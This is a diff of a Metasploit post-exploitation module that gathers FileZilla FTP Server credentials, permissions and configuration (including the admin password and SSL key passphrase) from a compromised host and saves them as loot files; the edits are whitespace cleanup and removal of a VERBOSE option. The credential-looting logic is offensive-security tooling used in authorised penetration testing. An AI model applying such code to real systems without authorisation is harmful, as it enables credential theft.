@@ -31,7 +31,6 @@ class Metasploit3 < Msf::Post
 		register_options(
 			[
 				OptBool.new('SSLCERT', [false, 'Loot the SSL Certificate if its there?', false]), # useful perhaps for MITM
-				OptBool.new('VERBOSE', [false, 'Be verbose and print all the credentials', true]),
 			], self.class)
 	end
 
@@ -176,7 +175,7 @@ class Metasploit3 < Msf::Post
 			print_line("")
 		end
 
-		configuration << [config['ftp_port'], config['ftp_bindip'], config['admin_port'], config['admin_bindip'], config['admin_pass'], 
+		configuration << [config['ftp_port'], config['ftp_bindip'], config['admin_port'], config['admin_bindip'], config['admin_pass'],
 			config['ssl'], config['ssl_certfile'], config['ssl_keypass']]
 
 			# report the goods!
@@ -192,13 +191,13 @@ class Metasploit3 < Msf::Post
 				:target_port => config['admin_port']
 			)
 
-		store_loot("filezilla.server.creds", "text/csv", session, credentials.to_csv, 
+		store_loot("filezilla.server.creds", "text/csv", session, credentials.to_csv,
 			"filezilla_server_credentials.txt", "FileZilla FTP Server Credentials")
 
-		store_loot("filezilla.server.perms", "text/csv", session, permissions.to_csv, 
+		store_loot("filezilla.server.perms", "text/csv", session, permissions.to_csv,
 			"filezilla_server_permissions.csv", "FileZilla FTP Server Permissions")
 
-		store_loot("filezilla.server.config", "text/csv", session, configuration.to_csv, 
+		store_loot("filezilla.server.config", "text/csv", session, configuration.to_csv,
 			"filezilla_server_configuration.csv", "FileZilla FTP Server Configuration")
 	end
 
@@ -324,7 +323,7 @@ class Metasploit3 < Msf::Post
 			end
 		end
 
-		groups = groups.uniq unless groups.uniq.nil? 
+		groups = groups.uniq unless groups.uniq.nil?
 		if !datastore['VERBOSE']
 			print_status("    Collected the following credentials:")
 			print_status("    Usernames: %u" % users)
